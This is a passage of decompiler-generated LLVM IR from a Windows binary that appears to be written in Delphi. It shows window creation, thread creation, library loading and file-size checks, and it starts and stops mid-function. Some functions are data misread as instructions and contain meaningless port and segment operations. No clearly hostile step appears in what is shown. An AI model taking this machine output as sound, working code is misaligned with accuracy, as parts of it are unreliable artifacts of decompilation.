  %121 = call i32 @"@LStrFromPChar"(), !insn.addr !1449
  %122 = call i32 @function_4060f0(), !insn.addr !1450
  %123 = call i32 @function_4057d0(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1451
  store i32* %105, i32** %.pre-phi.reg2mem, !insn.addr !1452
  store i32 %104, i32* %esp.1.reg2mem, !insn.addr !1452
  br label %dec_label_pc_4065d1, !insn.addr !1452

dec_label_pc_406509:                              ; preds = %dec_label_pc_406357
  %124 = call i32 @function_4034c8(), !insn.addr !1453
  %125 = icmp slt i32 %124, 5, !insn.addr !1454
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1454
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1454
  br i1 %125, label %dec_label_pc_4065d1, label %dec_label_pc_40651a, !insn.addr !1454

dec_label_pc_40651a:                              ; preds = %dec_label_pc_406509
  %126 = add i32 %esp.0.reload, -40, !insn.addr !1455
  %127 = inttoptr i32 %126 to i32*, !insn.addr !1455
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %127, align 4, !insn.addr !1455
  %128 = call i32 @function_404b20(), !insn.addr !1456
  %129 = add i32 %esp.0.reload, -44, !insn.addr !1457
  %130 = inttoptr i32 %129 to i32*, !insn.addr !1457
  %131 = add i32 %esp.0.reload, -48, !insn.addr !1458
  %132 = inttoptr i32 %131 to i32*, !insn.addr !1458
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %132, align 4, !insn.addr !1458
  %133 = call i32 @function_404b20(), !insn.addr !1459
  %134 = add i32 %esp.0.reload, -52, !insn.addr !1460
  %135 = inttoptr i32 %134 to i32*
  %136 = call i32 @"@LStrCatN"(), !insn.addr !1461
  %137 = add i32 %esp.0.reload, -56, !insn.addr !1462
  %138 = inttoptr i32 %137 to i32*, !insn.addr !1462
  %139 = call i32 @"@LStrFromPChar"(), !insn.addr !1463
  %140 = call i32 @function_4060f0(), !insn.addr !1464
  %141 = call i32 @function_404c78(), !insn.addr !1465
  store i32* %135, i32** %.pre-phi.reg2mem, !insn.addr !1466
  store i32 %134, i32* %esp.1.reg2mem, !insn.addr !1466
  br label %dec_label_pc_4065d1, !insn.addr !1466

dec_label_pc_406577:                              ; preds = %dec_label_pc_406357
  %142 = call i32 @function_4034c8(), !insn.addr !1467
  %143 = icmp slt i32 %142, 5, !insn.addr !1468
  store i32* %60, i32** %.pre-phi.reg2mem, !insn.addr !1468
  store i32 %59, i32* %esp.1.reg2mem, !insn.addr !1468
  br i1 %143, label %dec_label_pc_4065d1, label %dec_label_pc_406584, !insn.addr !1468

dec_label_pc_406584:                              ; preds = %dec_label_pc_406577
  %144 = add i32 %esp.0.reload, -40, !insn.addr !1469
  %145 = inttoptr i32 %144 to i32*, !insn.addr !1469
  store i32 ptrtoint ([5 x i8]* @global_var_40665c to i32), i32* %145, align 4, !insn.addr !1469
  %146 = call i32 @function_404b20(), !insn.addr !1470
  %147 = add i32 %esp.0.reload, -44, !insn.addr !1471
  %148 = inttoptr i32 %147 to i32*, !insn.addr !1471
  %149 = add i32 %esp.0.reload, -48, !insn.addr !1472
  %150 = inttoptr i32 %149 to i32*, !insn.addr !1472
  store i32 ptrtoint ([7 x i8]* @global_var_40666c to i32), i32* %150, align 4, !insn.addr !1472
  %151 = call i32 @function_404b20(), !insn.addr !1473
  %152 = add i32 %esp.0.reload, -52, !insn.addr !1474
  %153 = inttoptr i32 %152 to i32*
  %154 = call i32 @"@LStrCatN"(), !insn.addr !1475
  %155 = add i32 %esp.0.reload, -56, !insn.addr !1476
  %156 = inttoptr i32 %155 to i32*, !insn.addr !1476
  %157 = call i32 @function_4060f0(), !insn.addr !1477
  %158 = call i32 @function_404c78(), !insn.addr !1478
  store i32* %153, i32** %.pre-phi.reg2mem, !insn.addr !1478
  store i32 %152, i32* %esp.1.reg2mem, !insn.addr !1478
  br label %dec_label_pc_4065d1, !insn.addr !1478

dec_label_pc_4065d1:                              ; preds = %dec_label_pc_406357, %dec_label_pc_406584, %dec_label_pc_406577, %dec_label_pc_40651a, %dec_label_pc_406509, %dec_label_pc_4063da, %dec_label_pc_4063c9
  %159 = add i32 %esp.0.reload, -16, !insn.addr !1479
  %160 = inttoptr i32 %159 to i32*, !insn.addr !1479
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %.pre-phi.reload = load i32*, i32** %.pre-phi.reg2mem
  %161 = load i32, i32* %.pre-phi.reload, align 4, !insn.addr !1480
  call void @__writefsdword(i32 0, i32 %161), !insn.addr !1481
  %162 = add i32 %esp.1.reload, 8, !insn.addr !1482
  %163 = inttoptr i32 %162 to i32*, !insn.addr !1482
  store i32 4220403, i32* %163, align 4, !insn.addr !1482
  %164 = call i32 @"@LStrArrayClr"(), !insn.addr !1483
  ret i32 %164, !insn.addr !1484
}

define i32 @function_4065ec() local_unnamed_addr {
dec_label_pc_4065ec:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1485
  ret i32 %0, !insn.addr !1485
}

define i32 @function_4065f1() local_unnamed_addr {
dec_label_pc_4065f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1486
}

define i32 @function_4065f3(i32 %arg1) local_unnamed_addr {
dec_label_pc_4065f3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1487
}

define i32 @function_40661f() local_unnamed_addr {
dec_label_pc_40661f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1488
}

define i32 @function_406627() local_unnamed_addr {
dec_label_pc_406627:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1489
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1489
  store i32 %1, i32* %2, align 4, !insn.addr !1489
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1490
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1490
  %7 = add i8 %4, %6, !insn.addr !1490
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1490
  store i8 %7, i8* %8, align 1, !insn.addr !1490
  %9 = load i8, i8* %3, align 4, !insn.addr !1491
  %10 = load i32, i32* %eax, align 4
  %11 = udiv i32 %10, 256, !insn.addr !1491
  %12 = trunc i32 %11 to i8, !insn.addr !1491
  %13 = add i8 %9, %12, !insn.addr !1491
  %14 = inttoptr i32 %10 to i8*, !insn.addr !1491
  store i8 %13, i8* %14, align 1, !insn.addr !1491
  %15 = load i32, i32* %eax, align 4, !insn.addr !1492
  ret i32 %15, !insn.addr !1492
}

define i32 @function_40662e() local_unnamed_addr {
dec_label_pc_40662e:
  %0 = call i32 @function_40666c(), !insn.addr !1493
  ret i32 %0, !insn.addr !1493
}

define i32 @function_40666a() local_unnamed_addr {
dec_label_pc_40666a:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = trunc i32 %0 to i8
  %2 = mul i8 %1, 2, !insn.addr !1494
  %3 = inttoptr i32 %0 to i8*, !insn.addr !1494
  store i8 %2, i8* %3, align 1, !insn.addr !1494
  ret i32 %0, !insn.addr !1494
}

define i32 @function_40666c() local_unnamed_addr {
dec_label_pc_40666c:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i1 @__decompiler_undefined_function_1()
  %4 = call i1 @__decompiler_undefined_function_1()
  br i1 %3, label %dec_label_pc_4066d0, label %dec_label_pc_40666f, !insn.addr !1495

dec_label_pc_40666f:                              ; preds = %dec_label_pc_40666c
  %5 = icmp eq i1 %4, false, !insn.addr !1496
  br i1 %5, label %dec_label_pc_4066e4, label %dec_label_pc_406671, !insn.addr !1496

dec_label_pc_406671:                              ; preds = %dec_label_pc_40666f
  ret i32 %2, !insn.addr !1497

dec_label_pc_4066d0:                              ; preds = %dec_label_pc_40666c
  %6 = call i32 @function_4045ac(), !insn.addr !1498
  br label %dec_label_pc_4066e4, !insn.addr !1499

dec_label_pc_4066e4:                              ; preds = %dec_label_pc_4066d0, %dec_label_pc_40666f
  %7 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* null, i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1500
  %8 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1501
  %9 = add i32 %0, 20, !insn.addr !1502
  %10 = inttoptr i32 %9 to i32*, !insn.addr !1502
  %11 = load i32, i32* %10, align 4, !insn.addr !1502
  %12 = add i32 %0, 16, !insn.addr !1503
  %13 = inttoptr i32 %12 to i32*, !insn.addr !1503
  %14 = load i32, i32* %13, align 4, !insn.addr !1503
  %15 = add i32 %0, 8, !insn.addr !1504
  %16 = inttoptr i32 %15 to i32*, !insn.addr !1504
  %17 = load i32, i32* %16, align 4, !insn.addr !1504
  %18 = inttoptr i32 %11 to i32*, !insn.addr !1505
  %19 = call i32 @DefWindowProcA(i32* %18, i32 %14, i32 %1, i32 %17), !insn.addr !1505
  ret i32 %19, !insn.addr !1506
}

define i32 @function_40671c() local_unnamed_addr {
dec_label_pc_40671c:
  %0 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_40a650, align 4
  %1 = ptrtoint i32 (i32, i32, i32)* %0 to i32
  %2 = call i32* @CreateWindowExA(i32 0, i8* null, i8* null, i32 0, i32 0, i32 0, i32 0, i32 %1, i32* null, i32* nonnull @0, i32* nonnull @0, i32* nonnull @0), !insn.addr !1507
  %3 = ptrtoint i32* %2 to i32, !insn.addr !1507
  %4 = call i32 @SetWindowLongA(i32* inttoptr (i32 4220576 to i32*), i32 -4, i32 %3), !insn.addr !1508
  ret i32 %4, !insn.addr !1509
}

define i32 @function_406751(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406751:
  %merge7.reg2mem = alloca i32, !insn.addr !1510
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = trunc i32 %1 to i8
  %3 = mul i8 %2, 2, !insn.addr !1510
  %4 = inttoptr i32 %1 to i8*, !insn.addr !1510
  store i8 %3, i8* %4, align 1, !insn.addr !1510
  %5 = add i32 %1, 114, !insn.addr !1511
  %6 = inttoptr i32 %5 to i8*, !insn.addr !1511
  %7 = load i8, i8* %6, align 1, !insn.addr !1511
  %8 = udiv i32 %0, 256, !insn.addr !1511
  %9 = trunc i32 %8 to i8, !insn.addr !1511
  %10 = add i8 %7, %9, !insn.addr !1511
  store i8 %10, i8* %6, align 1, !insn.addr !1511
  %11 = add i8 %2, -32, !insn.addr !1512
  %12 = icmp ult i8 %2, 32, !insn.addr !1512
  %13 = icmp eq i8 %11, 0, !insn.addr !1512
  %14 = zext i8 %11 to i32, !insn.addr !1512
  %15 = and i32 %1, -256, !insn.addr !1512
  %16 = or i32 %15, %14, !insn.addr !1512
  %17 = or i1 %12, %13, !insn.addr !1513
  store i32 %16, i32* %merge7.reg2mem, !insn.addr !1513
  br i1 %17, label %dec_label_pc_40675a, label %dec_label_pc_4067ab, !insn.addr !1513

dec_label_pc_40675a:                              ; preds = %dec_label_pc_406751
  %18 = add i32 %16, 105, !insn.addr !1514
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1514
  %20 = load i8, i8* %19, align 1, !insn.addr !1514
  %21 = and i8 %20, %9, !insn.addr !1514
  store i8 %21, i8* %19, align 1, !insn.addr !1514
  %22 = trunc i32 %arg3 to i16, !insn.addr !1515
  %23 = inttoptr i32 %arg6 to i8*, !insn.addr !1515
  %24 = load i8, i8* %23, align 1, !insn.addr !1515
  call void @__asm_outsb(i16 %22, i8 %24), !insn.addr !1515
  %25 = add i32 %arg5, 105, !insn.addr !1516
  %26 = and i32 %25, 65535
  %27 = inttoptr i32 %26 to i8*, !insn.addr !1516
  %28 = load i8, i8* %27, align 1, !insn.addr !1516
  %29 = udiv i32 %arg2, 256, !insn.addr !1516
  %30 = trunc i32 %29 to i8, !insn.addr !1516
  %31 = and i8 %28, %30, !insn.addr !1516
  store i8 %31, i8* %27, align 1, !insn.addr !1516
  %32 = mul i32 %arg5, 2, !insn.addr !1517
  %33 = add i32 %arg2, 115, !insn.addr !1517
  %34 = add i32 %33, %32, !insn.addr !1517
  %35 = inttoptr i32 %34 to i8*, !insn.addr !1517
  %36 = load i8, i8* %35, align 1, !insn.addr !1517
  %37 = trunc i32 %arg2 to i8, !insn.addr !1517
  %38 = add i8 %36, %37, !insn.addr !1517
  %39 = icmp eq i8 %38, 0, !insn.addr !1517
  store i8 %38, i8* %35, align 1, !insn.addr !1517
  store i32 %arg1, i32* %merge7.reg2mem, !insn.addr !1518
  br i1 %39, label %dec_label_pc_4067ab, label %dec_label_pc_406769, !insn.addr !1518

dec_label_pc_406769:                              ; preds = %dec_label_pc_40675a
  %40 = inttoptr i32 %arg6 to i32*, !insn.addr !1519
  %41 = load i32, i32* %40, align 4, !insn.addr !1519
  call void @__asm_outsd(i16 %22, i32 %41), !insn.addr !1519
  %42 = inttoptr i32 %arg5 to i8*, !insn.addr !1520
  %43 = call i32* @FindWindowA(i8* %42, i8* bitcast (i32* @0 to i8*)), !insn.addr !1520
  %44 = ptrtoint i32* %43 to i32, !insn.addr !1520
  %45 = icmp eq i32* %43, null, !insn.addr !1521
  %46 = icmp eq i1 %45, false, !insn.addr !1522
  store i32 %44, i32* %merge7.reg2mem, !insn.addr !1522
  br i1 %46, label %dec_label_pc_4067ab, label %dec_label_pc_40678d, !insn.addr !1522

dec_label_pc_40678d:                              ; preds = %dec_label_pc_406769
  %47 = call i32 @function_40671c(), !insn.addr !1523
  %48 = call i32 @function_4036c8(), !insn.addr !1524
  %49 = inttoptr i32 %48 to i8*, !insn.addr !1525
  %50 = call i32* @LoadLibraryA(i8* %49), !insn.addr !1526
  %51 = ptrtoint i32* %50 to i32, !insn.addr !1526
  ret i32 %51, !insn.addr !1527

dec_label_pc_4067ab:                              ; preds = %dec_label_pc_406751, %dec_label_pc_406769, %dec_label_pc_40675a
  %merge7.reload = load i32, i32* %merge7.reg2mem
  ret i32 %merge7.reload, !insn.addr !1528
}

define i32 @function_406871(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_406871:
  %esp.0.in.reg2mem = alloca i32*, !insn.addr !1529
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %stack_var_32 = alloca i32, align 4
  %stack_var_28 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_28, align 4
  %stack_var_16 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_16, align 4
  %5 = bitcast i32* %eax to i8*
  %6 = load i8, i8* %5, align 4, !insn.addr !1529
  %7 = load i32, i32* %eax, align 4
  %8 = trunc i32 %7 to i8, !insn.addr !1529
  %9 = add i8 %6, %8, !insn.addr !1529
  %10 = inttoptr i32 %7 to i8*, !insn.addr !1529
  store i8 %9, i8* %10, align 1, !insn.addr !1529
  %11 = load i32, i32* %eax, align 4, !insn.addr !1530
  %12 = add i32 %11, 114, !insn.addr !1530
  %13 = inttoptr i32 %12 to i8*, !insn.addr !1530
  %14 = load i8, i8* %13, align 1, !insn.addr !1530
  %15 = udiv i32 %2, 256, !insn.addr !1530
  %16 = trunc i32 %15 to i8, !insn.addr !1530
  %17 = add i8 %14, %16, !insn.addr !1530
  store i8 %17, i8* %13, align 1, !insn.addr !1530
  %18 = load i32, i32* %eax, align 4
  %19 = trunc i32 %18 to i8, !insn.addr !1531
  %20 = add i8 %19, -32, !insn.addr !1531
  %21 = icmp ult i8 %19, 32, !insn.addr !1531
  %22 = icmp eq i8 %20, 0, !insn.addr !1531
  %23 = zext i8 %20 to i32, !insn.addr !1531
  %24 = and i32 %18, -256, !insn.addr !1531
  %25 = or i32 %24, %23, !insn.addr !1531
  store i32 %25, i32* %eax, align 4, !insn.addr !1531
  %26 = or i1 %21, %22, !insn.addr !1532
  br i1 %26, label %dec_label_pc_40687a, label %dec_label_pc_4068e9, !insn.addr !1532

dec_label_pc_40687a:                              ; preds = %dec_label_pc_406871
  %27 = add i32 %25, 105, !insn.addr !1533
  %28 = inttoptr i32 %27 to i8*, !insn.addr !1533
  %29 = load i8, i8* %28, align 1, !insn.addr !1533
  %30 = and i8 %29, %16, !insn.addr !1533
  store i8 %30, i8* %28, align 1, !insn.addr !1533
  %31 = load i32, i32* %stack_var_28, align 4, !insn.addr !1534
  store i32 %31, i32* %eax, align 4, !insn.addr !1534
  %32 = trunc i32 %arg3 to i16, !insn.addr !1535
  %33 = inttoptr i32 %arg6 to i8*, !insn.addr !1535
  %34 = load i8, i8* %33, align 1, !insn.addr !1535
  call void @__asm_outsb(i16 %32, i8 %34), !insn.addr !1535
  %35 = add i32 %arg5, 105, !insn.addr !1536
  %36 = and i32 %35, 65535
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1536
  %38 = load i8, i8* %37, align 1, !insn.addr !1536
  %39 = udiv i32 %arg2, 256, !insn.addr !1536
  %40 = trunc i32 %39 to i8, !insn.addr !1536
  %41 = and i8 %38, %40, !insn.addr !1536
  store i8 %41, i8* %37, align 1, !insn.addr !1536
  %42 = mul i32 %arg5, 2, !insn.addr !1537
  %43 = add i32 %arg2, 115, !insn.addr !1537
  %44 = add i32 %43, %42, !insn.addr !1537
  %45 = inttoptr i32 %44 to i8*, !insn.addr !1537
  %46 = load i8, i8* %45, align 1, !insn.addr !1537
  %47 = trunc i32 %arg2 to i8, !insn.addr !1537
  %48 = add i8 %46, %47, !insn.addr !1537
  %49 = icmp eq i8 %48, 0, !insn.addr !1537
  store i8 %48, i8* %45, align 1, !insn.addr !1537
  store i32* %stack_var_32, i32** %esp.0.in.reg2mem, !insn.addr !1538
  br i1 %49, label %dec_label_pc_4068cb, label %dec_label_pc_406889, !insn.addr !1538

dec_label_pc_406889:                              ; preds = %dec_label_pc_40687a
  %50 = icmp slt i8 %48, 0, !insn.addr !1537
  %51 = inttoptr i32 %arg6 to i32*, !insn.addr !1539
  %52 = load i32, i32* %51, align 4, !insn.addr !1539
  call void @__asm_outsd(i16 %32, i32 %52), !insn.addr !1539
  br i1 %50, label %dec_label_pc_406900, label %dec_label_pc_40688e, !insn.addr !1540

dec_label_pc_40688e:                              ; preds = %dec_label_pc_406889
  %53 = load i32, i32* %eax, align 4
  %54 = trunc i32 %53 to i8, !insn.addr !1541
  %55 = add i8 %54, -32, !insn.addr !1541
  %56 = icmp ult i8 %54, 32, !insn.addr !1541
  %57 = icmp eq i8 %55, 0, !insn.addr !1541
  %58 = zext i8 %55 to i32, !insn.addr !1541
  %59 = and i32 %53, -256, !insn.addr !1541
  %60 = or i32 %59, %58, !insn.addr !1541
  store i32 %60, i32* %eax, align 4, !insn.addr !1541
  %61 = or i1 %56, %57, !insn.addr !1542
  br i1 %61, label %dec_label_pc_406892, label %dec_label_pc_406901, !insn.addr !1542

dec_label_pc_406892:                              ; preds = %dec_label_pc_40688e
  %62 = add i32 %arg2, 105, !insn.addr !1543
  %63 = inttoptr i32 %62 to i8*, !insn.addr !1543
  %64 = load i8, i8* %63, align 1, !insn.addr !1543
  %65 = udiv i32 %53, 256, !insn.addr !1543
  %66 = trunc i32 %65 to i8, !insn.addr !1543
  %67 = and i8 %64, %66, !insn.addr !1543
  store i8 %67, i8* %63, align 1, !insn.addr !1543
  %68 = add i32 %arg6, 105, !insn.addr !1544
  %69 = inttoptr i32 %68 to i8*, !insn.addr !1544
  %70 = load i8, i8* %69, align 1, !insn.addr !1544
  %71 = and i8 %70, %40, !insn.addr !1544
  store i8 %71, i8* %69, align 1, !insn.addr !1544
  %72 = load i32, i32* %eax, align 4
  %73 = inttoptr i32 %72 to i8*, !insn.addr !1545
  %74 = load i8, i8* %73, align 1, !insn.addr !1545
  %75 = trunc i32 %72 to i8, !insn.addr !1545
  %76 = add i8 %74, %75, !insn.addr !1545
  store i8 %76, i8* %73, align 1, !insn.addr !1545
  %77 = load i32, i32* %eax, align 4
  %78 = inttoptr i32 %77 to i8*, !insn.addr !1546
  %79 = load i8, i8* %78, align 1, !insn.addr !1546
  %80 = trunc i32 %77 to i8, !insn.addr !1546
  %81 = add i8 %79, %80, !insn.addr !1546
  store i8 %81, i8* %78, align 1, !insn.addr !1546
  %82 = inttoptr i32 %arg2 to i32*, !insn.addr !1547
  %83 = load i32, i32* %82, align 4, !insn.addr !1547
  %84 = add i32 %83, %arg6, !insn.addr !1547
  store i32 %84, i32* %82, align 4, !insn.addr !1547
  %85 = load i32, i32* %eax, align 4
  %86 = inttoptr i32 %85 to i8*, !insn.addr !1548
  %87 = load i8, i8* %86, align 1, !insn.addr !1548
  %88 = trunc i32 %85 to i8, !insn.addr !1548
  %89 = add i8 %87, %88, !insn.addr !1548
  store i8 %89, i8* %86, align 1, !insn.addr !1548
  store i32 %arg5, i32* %stack_var_28, align 4, !insn.addr !1549
  %90 = call i32 @__readfsdword(i32 0), !insn.addr !1550
  store i32 %90, i32* %stack_var_16, align 4, !insn.addr !1550
  %91 = ptrtoint i32* %stack_var_16 to i32, !insn.addr !1550
  call void @__writefsdword(i32 0, i32 %91), !insn.addr !1551
  %92 = load i32, i32* @global_var_40a6d4, align 4, !insn.addr !1552
  %93 = add i32 %92, 1, !insn.addr !1552
  %94 = icmp eq i32 %93, 0, !insn.addr !1552
  store i32 %93, i32* @global_var_40a6d4, align 4, !insn.addr !1552
  %95 = icmp eq i1 %94, false, !insn.addr !1553
  br i1 %95, label %dec_label_pc_4068c3, label %dec_label_pc_4068b9, !insn.addr !1553

dec_label_pc_4068b9:                              ; preds = %dec_label_pc_406892
  %96 = call i32 @"@LStrClr"(), !insn.addr !1554
  br label %dec_label_pc_4068c3, !insn.addr !1554

dec_label_pc_4068c3:                              ; preds = %dec_label_pc_4068b9, %dec_label_pc_406892
  store i32 0, i32* %eax, align 4, !insn.addr !1555
  %97 = load i32, i32* %stack_var_16, align 4, !insn.addr !1556
  call void @__writefsdword(i32 0, i32 %97), !insn.addr !1557
  store i32* %stack_var_28, i32** %esp.0.in.reg2mem, !insn.addr !1557
  br label %dec_label_pc_4068cb, !insn.addr !1557

dec_label_pc_4068cb:                              ; preds = %dec_label_pc_4068c3, %dec_label_pc_40687a
  %esp.0.in.reload = load i32*, i32** %esp.0.in.reg2mem
  %esp.0 = ptrtoint i32* %esp.0.in.reload to i32
  %98 = add i32 %esp.0, -4, !insn.addr !1558
  %99 = inttoptr i32 %98 to i32*, !insn.addr !1558
  store i32 4221144, i32* %99, align 4, !insn.addr !1558
  %100 = load i32, i32* %eax, align 4, !insn.addr !1559
  ret i32 %100, !insn.addr !1559

dec_label_pc_4068e9:                              ; preds = %dec_label_pc_406871
  %101 = mul i32 %4, 2, !insn.addr !1560
  %102 = add i32 %1, 105, !insn.addr !1560
  %103 = add i32 %102, %101, !insn.addr !1560
  %104 = inttoptr i32 %103 to i32*, !insn.addr !1560
  %105 = load i32, i32* %104, align 4, !insn.addr !1560
  %106 = or i32 %105, %3, !insn.addr !1560
  store i32 %106, i32* %104, align 4, !insn.addr !1560
  %107 = add i32 %0, -1, !insn.addr !1561
  %108 = trunc i32 %3 to i16, !insn.addr !1562
  %109 = inttoptr i32 %107 to i32*, !insn.addr !1562
  %110 = load i32, i32* %109, align 4, !insn.addr !1562
  call void @__asm_outsd(i16 %108, i32 %110), !insn.addr !1562
  %111 = load i32, i32* %eax, align 4, !insn.addr !1563
  %112 = call i8 @__readgsbyte(i32 %111), !insn.addr !1563
  %113 = load i32, i32* %eax, align 4
  %114 = trunc i32 %113 to i8, !insn.addr !1563
  %115 = or i8 %112, %114, !insn.addr !1563
  call void @__writegsbyte(i32 %113, i8 %115), !insn.addr !1563
  %116 = load i32, i32* %eax, align 4
  %117 = inttoptr i32 %116 to i8*, !insn.addr !1564
  %118 = load i8, i8* %117, align 1, !insn.addr !1564
  %119 = trunc i32 %116 to i8, !insn.addr !1564
  %120 = add i8 %118, %119, !insn.addr !1564
  store i8 %120, i8* %117, align 1, !insn.addr !1564
  %121 = load i32, i32* %eax, align 4
  %122 = trunc i32 %121 to i8, !insn.addr !1565
  %123 = inttoptr i32 %121 to i8*, !insn.addr !1565
  %124 = load i8, i8* %123, align 1, !insn.addr !1565
  %125 = add i8 %124, %122, !insn.addr !1565
  %126 = zext i8 %125 to i32, !insn.addr !1565
  %127 = and i32 %121, -256, !insn.addr !1565
  %128 = or i32 %127, %126, !insn.addr !1565
  %129 = inttoptr i32 %128 to i8*, !insn.addr !1566
  %130 = load i8, i8* %129, align 1, !insn.addr !1566
  %131 = trunc i32 %3 to i8, !insn.addr !1567
  %132 = add i8 %125, %131, !insn.addr !1566
  %133 = add i8 %132, %130, !insn.addr !1567
  store i8 %133, i8* %129, align 1, !insn.addr !1567
  %134 = add i32 %128, 1, !insn.addr !1568
  store i32 %134, i32* %eax, align 4, !insn.addr !1568
  %135 = inttoptr i32 %134 to i8*, !insn.addr !1569
  %136 = load i8, i8* %135, align 1, !insn.addr !1569
  %137 = trunc i32 %134 to i8, !insn.addr !1569
  %138 = add i8 %136, %137, !insn.addr !1569
  store i8 %138, i8* %135, align 1, !insn.addr !1569
  br label %dec_label_pc_406900, !insn.addr !1569

dec_label_pc_406900:                              ; preds = %dec_label_pc_4068e9, %dec_label_pc_406889
  %139 = load i32, i32* %eax, align 4, !insn.addr !1569
  ret i32 %139, !insn.addr !1569

dec_label_pc_406901:                              ; preds = %dec_label_pc_40688e
  %140 = inttoptr i32 %60 to i8*, !insn.addr !1570
  %141 = load i8, i8* %140, align 1, !insn.addr !1570
  %142 = add i8 %141, %55, !insn.addr !1570
  store i8 %142, i8* %140, align 1, !insn.addr !1570
  %143 = load i32, i32* %eax, align 4
  %144 = inttoptr i32 %143 to i8*, !insn.addr !1571
  %145 = load i8, i8* %144, align 1, !insn.addr !1571
  %146 = trunc i32 %arg3 to i8, !insn.addr !1571
  %147 = add i8 %145, %146, !insn.addr !1571
  store i8 %147, i8* %144, align 1, !insn.addr !1571
  %148 = load i32, i32* %eax, align 4, !insn.addr !1572
  %149 = add i32 %148, 1, !insn.addr !1572
  %150 = mul i32 %149, 2, !insn.addr !1573
  %151 = inttoptr i32 %150 to i8*, !insn.addr !1573
  %152 = load i8, i8* %151, align 2, !insn.addr !1573
  %153 = trunc i32 %149 to i8, !insn.addr !1573
  %154 = add i8 %152, %153, !insn.addr !1573
  store i8 %154, i8* %151, align 2, !insn.addr !1573
  %155 = inttoptr i32 %149 to i8*, !insn.addr !1574
  %156 = load i8, i8* %155, align 1, !insn.addr !1574
  %157 = add i8 %156, %153, !insn.addr !1574
  store i8 %157, i8* %155, align 1, !insn.addr !1574
  ret i32 %149, !insn.addr !1575
}

define i32 @function_40691f() local_unnamed_addr {
dec_label_pc_40691f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1576
}

define i32 @function_40692c() local_unnamed_addr {
dec_label_pc_40692c:
  %esp.1.reg2mem = alloca i32, !insn.addr !1577
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-84 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1578
  store i32 %0, i32* %stack_var_-56, align 4, !insn.addr !1578
  %1 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1578
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1579
  %2 = call i32 @"@LStrCat3"(), !insn.addr !1580
  %3 = call i32 @function_4036c8(), !insn.addr !1581
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1582
  store i8* %4, i8** %stack_var_-84, align 4, !insn.addr !1582
  %5 = ptrtoint i8** %stack_var_-84 to i32, !insn.addr !1582
  %6 = call i32* @CreateFileA(i8* %4, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), %_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !1583
  %7 = icmp eq i32* %6, inttoptr (i32 -1 to i32*), !insn.addr !1584
  store i32 %5, i32* %esp.1.reg2mem, !insn.addr !1585
  br i1 %7, label %dec_label_pc_406acb, label %dec_label_pc_406996, !insn.addr !1585

dec_label_pc_406996:                              ; preds = %dec_label_pc_40692c
  %8 = ptrtoint i32* %6 to i32, !insn.addr !1583
  store i32 %8, i32* %stack_var_-92, align 4, !insn.addr !1586
  %9 = ptrtoint i32* %stack_var_-92 to i32, !insn.addr !1586
  %10 = call i32 @GetFileSize(i32* null, i32* %6), !insn.addr !1587
  %11 = add i32 %10, 1
  %12 = icmp ult i32 %11, 2
  store i32 %9, i32* %esp.1.reg2mem, !insn.addr !1588
  br i1 %12, label %dec_label_pc_406acb, label %dec_label_pc_4069b2, !insn.addr !1588

